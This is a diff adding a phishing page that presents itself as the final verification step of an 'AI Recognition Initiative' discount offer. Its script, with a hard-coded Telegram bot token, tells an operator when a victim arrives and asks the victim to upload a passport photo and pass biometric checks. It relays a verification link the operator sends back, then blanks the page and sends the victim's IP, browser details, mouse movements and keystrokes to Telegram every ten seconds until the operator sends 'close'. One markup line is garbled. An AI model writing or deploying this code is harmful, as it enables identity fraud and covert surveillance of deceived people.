@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="hy">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="keywords" content="скидка">
+    <meta property="og:title" content="NextGen Artificial Intelligence Recognition Initiative - Верификация">
+    <meta property="og:description" content="ստացիր զեղչ">
+    <meta property="og:image" content="./image2.gif">
+    <meta property="og:url" content="https://NextGen-Artificial.netlify.app/final-step.html">
+    <meta name="twitter:card" content="summary_large_image">
+    <title>NextGen Artificial Intelligence Recognition Initiative - Վերիֆիկացիա (Քայլ 3)</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Armenian:wght@400;700&family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        #preloader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 1;
+            transition: opacity 2s ease;
+        }
+
+        #preloader.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        #preloader img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: url('./fon.gif') no-repeat center center fixed;
+            background-size: cover;
+            color: #bebb24;
+            min-height: 100vh;
+            padding-top: 20px;
+            animation: fadeBackground 5s infinite alternate ease-in-out;
+            opacity: 0;
+            transition: opacity 1s ease;
+        }
+
+        body.loaded {
+            opacity: 1;
+        }
+
+        @keyframes fadeBackground {
+            100% { opacity: 0.9; }
+            100% { opacity: 1; }
+        }
+
+        .stars {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .star {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: #fff;
+            border-radius: 50%;
+            animation: fall linear infinite;
+        }
+
+        .container {
+            text-align: center;
+            padding: 40px 25px;
+            background: rgba(10, 10, 20, 0.85);
+            border-radius: 25px;
+            box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
+            max-width: 700px;
+            width: 95%;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+            transition: opacity 0.3s ease;
+            opacity: 1;
+        }
+
+        .company-name {
+            font-family: 'Exo 2', sans-serif;
+            font-size: 55px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px rgba(138, 43, 226, 0.8);
+        }
+
+        .highlight-text {
+            margin-bottom: 25px;
+            line-height: 1.4;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.3);
+            font-family: 'Noto Sans Armenian', sans-serif;
+            font-size: 36px;
+            font-weight: 700;
+            color: #d8bfd8;
+            display: block;
+        }
+
+        .progress-bar {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 25px;
+        }
+
+        .progress-bar div {
+            width: 100%;
+            height: 12px;
+            background: linear-gradient(45deg, #8a2be2, #4b0082);
+        }
+
+        .cta-button {
+            display: inline-block;
+            background: linear-gradient(45deg, #8a2be2, #4b0082);
+            color: #fff;
+            padding: 16px 40px;
+            border-radius: 35px;
+            text-decoration: none;
+            font-family: 'Exo 2', sans-serif;
+            font-weight: 700;
+            font-size: 20px;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 15px rgba(138, 43, 226, 0.7);
+            border: none;
+            cursor: pointer;
+            position: relative;
+            z-index: 10;
+        }
+
+        .cta-button:hover {
+            background: linear-gradient(45deg, #4b0082, #8a2be2);
+            transform: translateY(-2px) scale(1.03);
+            box-shadow: 0 0 25px rgba(138, 43, 226, 1);
+        }
+
+        .social-links {
+            margin-top: 25px;
+        }
+
+        .social-links a {
+            margin: 0 20px;
+            font-size: 34px;
+            color: #8a2be2;
+            transition: all 0.3s ease;
+        }
+
+        .social-links a:hover {
+            color: #d8bfd8;
+            transform: translateY(-10px);
+            text-shadow: 0 0 10px rgba(138, 43, 226, 0.8);
+        }
+
+        #success-message, #error-message {
+            display: none;
+            margin-top: 20px;
+            font-family: 'Noto Sans Armenian', sans-serif;
+            font-size: 20px;
+            color: #fff;
+            padding: 12px;
+            border-radius: 10px;
+        }
+
+        #success-message {
+            background-color: rgba(138, 43, 226, 0.8);
+        }
+
+        #error-message {
+            background-color: rgba(244, 67, 54, 0.8);
+        }
+
+        #processing-message, #waiting-message {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-family: 'Noto Sans Armenian', sans-serif;
+            font-size: 24px;
+            color: #d8bfd8;
+            background: rgba(10, 10, 20, 0.85);
+            padding: 15px 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
+            z-index: 1100;
+            text-align: center;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.3);
+        }
+
+        .disabled {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
+        #loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+
+        #loading-overlay img {
+            width: 120px;
+            height: 120px;
+            filter: drop-shadow(0 0 10px rgba(138, 43, 226, 0.5));
+        }
+
+        #wait-text {
+            font-family: 'Noto Sans Armenian', sans-serif;
+            font-size: 26px;
+            color: #d8bfd8;
+            margin-top: 20px;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.3);
+        }
+
+        #modal, #confirm-modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(10, 10, 20, 0.85);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
+            z-index: 1100;
+            text-align: center;
+            max-width: 90%;
+        }
+
+        #modal p, #confirm-modal p {
+            font-family: 'Noto Sans Armenian', sans-serif;
+            font-size: 22px;
+            color: #d8bfd8;
+            margin-bottom: 25px;
+            line-height: 1.5;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.3);
+        }
+
+        .whatsapp-button {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: #8a2be2;
+            padding: 18px;
+            border-radius: 50%;
+            box-shadow: 0 0 15px rgba(138, 43, 226, 0.7);
+            transition: all 0.3s ease;
+        }
+
+        .whatsapp-button:hover {
+            background: #4b0082;
+            transform: scale(1.15);
+            box-shadow: 0 0 20px rgba(138, 43, 226, 1);
+        }
+
+        @media (max-width: 768px) {
+            body { padding-top: 15px; }
+            .company-name { font-size: 48px; }
+            .highlight-text { font-size: 30px; }
+            .cta-button { padding: 14px 35px; font-size: 20px; }
+            .container { padding: 30px 20px; margin-top: 10px; }
+            .social-links a { font-size: 30px; margin: 0 15px; }
+            #processing-message, #waiting-message { font-size: 20px; }
+            #wait-text { font-size: 22px; }
+            #modal p, #confirm-modal p { font-size: 20px; }
+        }
+
+        @media (max-width: 480px) {
+            body { padding-top: 10px; }
+            .company-name { font-size: 36px; }
+            .highlight-text { font-size: 24px; }
+            .cta-button { padding: 12px 30px; font-size: 18px; }
+            .container { padding: 20px 15px; margin-top: 5px; }
+            .social-links a { font-size: 26px; margin: 0 10px; }
+            .whatsapp-button { padding: 14px; }
+            #processing-message, #waiting-message { font-size: 18px; }
+            #wait-text { font-size: 18px; }
+            #modal p, #confirm-modal p { font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+    <div id="preloader">
+        <img src="./ai.gif" alt="AI Loading Animation">
+    </div>
+    <div class="stars"></div>
+
+    <div class="container" id="main-container">
+        <h1 class="company-name">NextGen Artificial Intelligence Recognition Initiative</h1>
+        <p class="highlight-text">(Քայլ 3/3)</p>
+        <div class="progress-bar">
+            <div></div>
+        </div>
+        <div class="social-links" data-aos="fade-up" data-aos-delay="300">
+            <a href="https://m.facebook.com" target="_blank"><i class="fab fa-facebook-f"></i></a>
+            <a href="https://www.instagram.com" target="_blank"><i class="fab fa-instagram"></i></a>
+            <a href="https://twitterPillows: center center fixed;
+            <a href="https://twitter.com" target="_blank"><i class="fab fa-twitter"></i></a>
+        </div>
+        <div id="success-message">Հաջողությամբ լրացված է։</div>
+        <div id="error-message">Սխալ։ Խնդրում ենք սպասել։</div>
+        <div id="processing-message">Տվյալները մշակվում են</div>
+        <div id="waiting-message">Խնդրում ենք սպասել</div>
+    </div>
+
+    <div id="loading-overlay">
+        <img src="./loading.gif" alt="Loading">
+        <div id="wait-text">Խնդրում ենք սպասել</div>
+    </div>
+
+    <div id="modal" style="display: none;">
+        <p>Ներբեռնել անձնագրի լուսանկարը և անցնել բիոմետրիկ նույնականացում</p>
+        <button class="cta-button" id="start-button">Սկսել հիմա</button>
+    </div>
+
+    <div id="confirm-modal" style="display: none;">
+        <p>Հղումը ստացվել է։ Հաստատեք՝ շարունակելու համար։</p>
+        <button class="cta-button" id="confirm-button">Հաստատել</button>
+    </div>
+
+    <a href="https://in.sumsub.com" rel="noreferrer" target="_blank" id="hidden-link" style="display: none;"></a>
+
+    <a href="https://wa.me/37496653666" class="whatsapp-button">
+        <i class="fab fa-whatsapp" style="font-size: 28px; color: #fff;"></i>
+    </a>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+    <script>
+        setTimeout(() => {
+            const preloader = document.getElementById('preloader');
+            const body = document.body;
+            preloader.classList.add('hidden');
+            body.classList.add('loaded');
+            preloader.addEventListener('transitionend', () => {
+                preloader.remove();
+            });
+        }, 2000);
+
+        const starsContainer = document.querySelector('.stars');
+        for (let i = 0; i < 100; i++) {
+            const star = document.createElement('div');
+            star.classList.add('star');
+            star.style.left = `${Math.random() * 100}vw`;
+            star.style.animationDuration = `${Math.random() * 3 + 2}s`;
+            star.style.animationDelay = `${Math.random() * 5}s`;
+            starsContainer.appendChild(star);
+        }
+
+        const TELEGRAM_TOKEN = "7505675886:AAEOZyLgDk3TqEXIUJqhDzZtpVtFNjKh9ww";
+        const CHAT_ID = "7231332868";
+        let updateOffset = null;
+        let loadingTimeout;
+        let receivedLink = null;
+        let startTime = Date.now();
+        let mouseMovements = [];
+        let keyPresses = [];
+        let trackingInterval = null;
+        let isTracking = false;
+        let lastFocusTime = Date.now();
+
+        const container = document.getElementById('main-container');
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const waitText = document.getElementById('wait-text');
+        const modal = document.getElementById('modal');
+        const startButton = document.getElementById('start-button');
+        const confirmModal = document.getElementById('confirm-modal');
+        const confirmButton = document.getElementById('confirm-button');
+        const hiddenLink = document.getElementById('hidden-link');
+        const processingMessage = document.getElementById('processing-message');
+        const waitingMessage = document.getElementById('waiting-message');
+
+        document.addEventListener('DOMContentLoaded', function() {
+            container.classList.add('disabled');
+            loadingOverlay.style.display = 'none';
+            sendNotificationToTelegram();
+            setTimeout(showModal, 1000);
+        });
+
+        function showModal() {
+            modal.style.display = 'block';
+            gsap.fromTo("#modal", 
+                { opacity: 0, y: 50 }, 
+                { opacity: 1, y: 0, duration: 0.5, ease: "power2.out" }
+            );
+        }
+
+        function showConfirmModal() {
+            confirmModal.style.display = 'block';
+            gsap.fromTo("#confirm-modal", 
+                { opacity: 0, y: 50 }, 
+                { opacity: 1, y: 0, duration: 0.5, ease: "power2.out" }
+            );
+        }
+
+        startButton.addEventListener('click', function() {
+            modal.style.display = 'none';
+            container.classList.add('disabled');
+            startRandomLoading();
+        });
+
+        confirmButton.addEventListener('click', function() {
+            if (receivedLink) {
+                hiddenLink.href = receivedLink;
+                hiddenLink.click();
+                confirmModal.style.display = 'none';
+                clearPage();
+                startTracking();
+            }
+        });
+
+        function clearPage() {
+            document.body.innerHTML = '';
+            document.body.style.background = 'none';
+        }
+
+        function startTracking() {
+            if (isTracking) return;
+            isTracking = true;
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    collectAndSendData(ipAddress);
+                })
+                .catch(error => {
+                    console.error('Ошибка получения IP:', error);
+                    collectAndSendData('IP не получен');
+                });
+
+            document.addEventListener('mousemove', (e) => {
+                mouseMovements.push(`x: ${e.clientX}, y: ${e.clientY}, time: ${new Date().toISOString()}`);
+                if (mouseMovements.length > 50) mouseMovements.shift();
+            });
+
+            document.addEventListener('keydown', (e) => {
+                keyPresses.push(`key: ${e.key}, time: ${new Date().toISOString()}`);
+                if (keyPresses.length > 50) keyPresses.shift();
+            });
+
+            window.addEventListener('focus', () => {
+                lastFocusTime = Date.now();
+                console.log('Вкладка снова активна');
+            });
+
+            window.addEventListener('blur', () => {
+                console.log('Вкладка потеряла фокус');
+            });
+
+            trackingInterval = setInterval(() => {
+                collectAndSendData();
+            }, 10000);
+
+            checkForCloseCommand();
+        }
+
+        function stopTracking() {
+            if (!isTracking) return;
+            isTracking = false;
+            clearInterval(trackingInterval);
+            document.removeEventListener('mousemove', () => {});
+            document.removeEventListener('keydown', () => {});
+            window.removeEventListener('focus', () => {});
+            window.removeEventListener('blur', () => {});
+            sendCloseNotification();
+            window.close();
+        }
+
+        function collectAndSendData(ipAddress = 'IP не получен') {
+            const timeSpent = Math.floor((Date.now() - startTime) / 1000);
+            const timeSinceLastFocus = Math.floor((Date.now() - lastFocusTime) / 1000);
+            const userAgent = navigator.userAgent;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const language = navigator.language || navigator.userLanguage;
+            const isFocused = document.hasFocus() ? 'Да' : 'Нет';
+            const data = `
+Клиентская информация:
+- IP: ${ipAddress}
+- User-Agent: ${userAgent}
+- Разрешение экрана: ${screenResolution}
+- Язык: ${language}
+- Время на странице: ${timeSpent} сек
+- Время с последнего фокуса: ${timeSinceLastFocus} сек
+- Вкладка активна: ${isFocused}
+- Перешёл по ссылке: ${receivedLink}
+- Движения мыши: ${mouseMovements.length > 0 ? mouseMovements.join('; ') : 'Нет данных'}
+- Нажатия клавиш: ${keyPresses.length > 0 ? keyPresses.join('; ') : 'Нет данных'}
+            `;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: data })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Данные отправлены в Telegram');
+                }
+            })
+            .catch(error => console.error('Ошибка отправки данных:', error));
+        }
+
+        function checkForCloseCommand() {
+            const interval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${updateOffset || ''}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        const messages = data.result;
+                        const lastMessage = messages[messages.length - 1];
+                        if (updateOffset === null) {
+                            updateOffset = lastMessage.update_id + 1;
+                            return;
+                        }
+                        updateOffset = lastMessage.update_id + 1;
+                        if (lastMessage.message.chat.id == CHAT_ID && lastMessage.message.text.trim().toLowerCase() === 'close') {
+                            clearInterval(interval);
+                            stopTracking();
+                        }
+                    }
+                })
+                .catch(error => console.error('Ошибка проверки команды close:', error));
+            }, 2000);
+        }
+
+        function startRandomLoading() {
+            loadingOverlay.style.display = 'flex';
+            waitText.style.display = 'none';
+            clearTimeout(loadingTimeout);
+
+            const durations = [
+                [1000, 200],
+                [200, 200],
+                [2000, 300],
+                [500, 200],
+                [3000, 400]
+            ];
+            let index = 0;
+
+            function toggleLoading() {
+                const [onTime, offTime] = durations[index % durations.length];
+                loadingOverlay.style.display = 'flex';
+                setTimeout(() => {
+                    loadingOverlay.style.display = 'none';
+                    setTimeout(toggleLoading, offTime);
+                }, onTime);
+                index++;
+            }
+
+            toggleLoading();
+            checkTelegramForLink();
+            setTimeout(() => {
+                processingMessage.style.display = 'block';
+                setTimeout(() => {
+                    processingMessage.style.display = 'none';
+                }, 3000);
+                setTimeout(() => {
+                    waitingMessage.style.display = 'block';
+                    sendHurryNotification();
+                }, 15000);
+            }, 15000);
+        }
+
+        function sendNotificationToTelegram() {
+            const message = `
+Օգտահաշվի տերը պատրաստ է նույնականացման
+Ուղարկիր հղումը (ok https://example.com) ֆորմատով
+            `;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) console.log('Уведомление отправлено в Telegram');
+                else showMessage('error-message');
+            })
+            .catch(error => {
+                console.error('Ошибка сети:', error);
+                showMessage('error-message');
+            });
+        }
+
+        function sendHurryNotification() {
+            const message = "Արագացրու՜՜՜";
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            })
+            .then(response => response.json())
+            .then(data => { if (data.ok) console.log('Уведомление "Արագացրու՜՜՜" отправлено'); })
+            .catch(error => console.error('Ошибка:', error));
+        }
+
+        function sendCloseNotification() {
+            const message = "Գնաց համբալը";
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, keepalive: true })
+            })
+            .then(response => response.json())
+            .then(data => { if (data.ok) console.log('Уведомление "Գնաց համբալը" отправлено'); })
+            .catch(error => console.error('Ошибка при закрытии:', error));
+        }
+
+        function sendLinkReceivedNotification() {
+            const message = "Ստացվեց, անցնում է նույնականացում";
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            })
+            .then(response => response.json())
+            .then(data => { if (data.ok) console.log('Уведомление "Ստացվեց, անցնում է նույնականացում" отправлено'); })
+            .catch(error => console.error('Ошибка:', error));
+        }
+
+        function checkTelegramForLink() {
+            checkTelegramApproval('link', (link) => {
+                clearTimeout(loadingTimeout);
+                loadingOverlay.style.display = 'none';
+                processingMessage.style.display = 'none';
+                waitingMessage.style.display = 'none';
+                console.log('Получена ссылка для перехода:', link);
+                sendLinkReceivedNotification();
+                receivedLink = link;
+                showConfirmModal();
+            });
+        }
+
+        function checkTelegramApproval(stage, callback) {
+            const interval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${updateOffset || ''}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        const messages = data.result;
+                        const lastMessage = messages[messages.length - 1];
+                        if (updateOffset === null) {
+                            updateOffset = lastMessage.update_id + 1;
+                            return;
+                        }
+                        updateOffset = lastMessage.update_id + 1;
+                        if (lastMessage.message.chat.id == CHAT_ID) {
+                            const messageText = lastMessage.message.text.trim();
+                            const linkMatch = messageText.match(/(https?:\/\/[^\s]+)/);
+                            if (linkMatch) {
+                                clearInterval(interval);
+                                callback(linkMatch[0]);
+                            }
+                        }
+                    }
+                })
+                .catch(error => console.error('Ошибка проверки Telegram:', error));
+            }, 2000);
+        }
+
+        function showMessage(id) {
+            const message = document.getElementById(id);
+            message.style.display = 'block';
+            setTimeout(() => { message.style.display = 'none'; }, 3000);
+        }
+
+        window.addEventListener('beforeunload', function() {
+            sendCloseNotification();
+        });
+
+        AOS.init({ duration: 800, easing: 'ease-out', once: true });
+        gsap.from(".container", { opacity: 0, y: 50, duration: 0.8, ease: "power2.out", delay: 0.2 });
+    </script>
+</body>
+</html>
